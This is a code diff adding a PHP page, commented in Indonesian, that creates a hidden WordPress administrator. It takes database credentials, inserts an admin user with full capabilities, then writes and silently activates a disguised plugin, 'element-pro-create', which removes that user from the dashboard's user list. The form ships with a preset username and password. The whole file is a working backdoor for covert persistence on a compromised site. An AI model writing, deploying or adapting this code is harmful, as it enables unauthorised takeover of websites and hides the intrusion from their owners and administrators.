@@ -1,0 +1,199 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $host = $_POST['db_host'];
+    $user = $_POST['db_user'];
+    $pass = $_POST['db_pass'];
+    $name = $_POST['db_name'];
+    $admin_user = $_POST['admin_user'];
+    $admin_pass = $_POST['admin_pass'];
+    $admin_email = $_POST['admin_email'];
+
+    // Koneksi database
+    $conn = new mysqli($host, $user, $pass, $name);
+    if ($conn->connect_error) {
+        die("Koneksi gagal: " . $conn->connect_error);
+    }
+
+    // Fungsi bantu cari tabel berdasarkan kriteria kolom
+    function find_table_by_column($conn, $like_pattern, $column_name) {
+        $result = $conn->query("SHOW TABLES LIKE '{$like_pattern}'");
+        while ($row = $result->fetch_row()) {
+            $table = $row[0];
+            $check = $conn->query("SHOW COLUMNS FROM `{$table}` LIKE '{$column_name}'");
+            if ($check && $check->num_rows > 0) {
+                return $table;
+            }
+        }
+        return false;
+    }
+
+    // Cari tabel users utama (yang ada kolom user_login)
+    $users_table = find_table_by_column($conn, '%_users', 'user_login');
+    if (!$users_table) {
+        die("Gagal menemukan tabel users utama dengan kolom 'user_login'");
+    }
+
+    // Ambil prefix dari nama tabel users (hapus '_users' dan tambahkan underscore)
+    if (substr($users_table, -6) === '_users') {
+        $prefix = substr($users_table, 0, -6) . '_';
+    } else {
+        $prefix = '';
+    }
+
+    // Cari tabel usermeta (yang ada kolom user_id), dengan prefix yang sama
+    $usermeta_table = $prefix . 'usermeta';
+    $check_usermeta = $conn->query("SHOW TABLES LIKE '{$usermeta_table}'");
+    if ($check_usermeta->num_rows === 0) {
+        die("Gagal menemukan tabel usermeta dengan nama '{$usermeta_table}'");
+    }
+
+    // Cari tabel options (yang ada kolom option_name), dengan prefix yang sama
+    $options_table = $prefix . 'options';
+    $check_options = $conn->query("SHOW TABLES LIKE '{$options_table}'");
+    if ($check_options->num_rows === 0) {
+        die("Gagal menemukan tabel options dengan nama '{$options_table}'");
+    }
+
+    // Cek apakah user sudah ada
+    $stmt = $conn->prepare("SELECT ID FROM {$users_table} WHERE user_login = ?");
+    if (!$stmt) {
+        die("Prepare statement gagal: " . $conn->error);
+    }
+    $stmt->bind_param("s", $admin_user);
+    $stmt->execute();
+    $stmt->store_result();
+    if ($stmt->num_rows > 0) {
+        die("User sudah ada.");
+    }
+    $stmt->close();
+
+    // Fungsi hash password manual ala WP (bcrypt)
+    function wp_hash_password($password) {
+        $salt = substr(str_replace('+', '.', base64_encode(random_bytes(22))), 0, 22);
+        return crypt($password, '$2y$10$' . $salt);
+    }
+
+    $hashed = wp_hash_password($admin_pass);
+    $now = date('Y-m-d H:i:s');
+
+    // Insert user baru
+    $stmt = $conn->prepare("INSERT INTO {$users_table} (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES (?, ?, ?, ?, ?, 0, ?)");
+    if (!$stmt) {
+        die("Prepare statement insert user gagal: " . $conn->error);
+    }
+    $stmt->bind_param("ssssss", $admin_user, $hashed, $admin_user, $admin_email, $now, $admin_user);
+    $stmt->execute();
+    $user_id = $stmt->insert_id;
+    $stmt->close();
+
+    if (!$user_id) {
+        die("Gagal memasukkan user baru.");
+    }
+
+    // Insert usermeta untuk administrator
+    $meta1 = $conn->prepare("INSERT INTO {$usermeta_table} (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+    $cap_key = $prefix . 'capabilities';
+    $cap_value = 'a:1:{s:13:"administrator";b:1;}';
+    $meta1->bind_param("iss", $user_id, $cap_key, $cap_value);
+    $meta1->execute();
+    $meta1->close();
+
+    $meta2 = $conn->prepare("INSERT INTO {$usermeta_table} (user_id, meta_key, meta_value) VALUES (?, ?, ?)");
+    $level_key = $prefix . 'user_level';
+    $level_value = '10';
+    $meta2->bind_param("iss", $user_id, $level_key, $level_value);
+    $meta2->execute();
+    $meta2->close();
+
+    // Buat plugin tersembunyi untuk menyembunyikan admin ini di dashboard
+    $plugin_code = '<?php
+/**
+ * Plugin Name: Hidden Admin Blocker
+ * Description: Menyembunyikan user admin tertentu dari tampilan dashboard.
+ */
+add_action("pre_user_query", function($user_search) {
+    if (!current_user_can("manage_options")) return;
+    global $wpdb;
+    $hidden_user = "' . addslashes($admin_user) . '";
+    $user_search->query_where .= " AND {$wpdb->users}.user_login != \'$hidden_user\'";
+});';
+
+    $plugin_dir = __DIR__ . "/wp-content/plugins/element-pro-create";
+    if (!is_dir($plugin_dir)) {
+        mkdir($plugin_dir, 0755, true);
+    }
+    file_put_contents($plugin_dir . "/element-pro-create.php", $plugin_code);
+
+    // Fungsi ambil option_value dari tabel options
+    function get_option_value($conn, $table, $option_name) {
+        $stmt = $conn->prepare("SELECT option_value FROM $table WHERE option_name = ?");
+        $stmt->bind_param("s", $option_name);
+        $stmt->execute();
+        $stmt->bind_result($value);
+        $stmt->fetch();
+        $stmt->close();
+        return $value;
+    }
+
+    // Update option active_plugins supaya plugin aktif
+    $active_plugins = get_option_value($conn, $options_table, 'active_plugins');
+    $plugins = @unserialize($active_plugins);
+    if (!is_array($plugins)) $plugins = [];
+    $plugin_path = "element-pro-create/element-pro-create.php";
+    if (!in_array($plugin_path, $plugins)) {
+        $plugins[] = $plugin_path;
+        $plugins_serialized = serialize($plugins);
+        $stmt = $conn->prepare("UPDATE {$options_table} SET option_value = ? WHERE option_name = 'active_plugins'");
+        $stmt->bind_param("s", $plugins_serialized);
+        $stmt->execute();
+        $stmt->close();
+    }
+
+    echo "<div class='p-4 bg-green-200 text-green-900 rounded'>✅ Admin berhasil dibuat & disembunyikan! Silakan login ke WordPress.</div>";
+    exit;
+}
+
+?>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Buat Admin Tersembunyi</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-gray-100">
+<div class="max-w-lg mx-auto mt-10 bg-white shadow p-6 rounded-lg">
+    <h2 class="text-2xl font-bold mb-4 text-center">Buat Admin Tersembunyi</h2>
+    <form method="POST">
+        <label class="block mb-2">DB Host</label>
+        <input name="db_host" required class="w-full p-2 border rounded mb-4" value="localhost">
+
+        <label class="block mb-2">DB Username</label>
+        <input name="db_user" required class="w-full p-2 border rounded mb-4">
+
+        <label class="block mb-2">DB Password</label>
+        <input name="db_pass" type="password" class="w-full p-2 border rounded mb-4">
+
+        <label class="block mb-2">DB Name</label>
+        <input name="db_name" required class="w-full p-2 border rounded mb-4">
+
+        <label class="block mb-2">Username Admin</label>
+        <input name="admin_user" required class="w-full p-2 border rounded mb-4" value="adminhidden">
+
+        <label class="block mb-2">Password Admin</label>
+        <input name="admin_pass" required class="w-full p-2 border rounded mb-4" value="Sunshine.0110">
+
+        <label class="block mb-2">Email Admin</label>
+        <input name="admin_email" required class="w-full p-2 border rounded mb-6" value="admin@site.com">
+
+        <button type="submit" class="bg-blue-600 hover:bg-blue-700 text-white py-2 px-4 rounded w-full">
+            Create Hidden Admin
+        </button>
+    </form>
+</div>
+</body>
+</html>
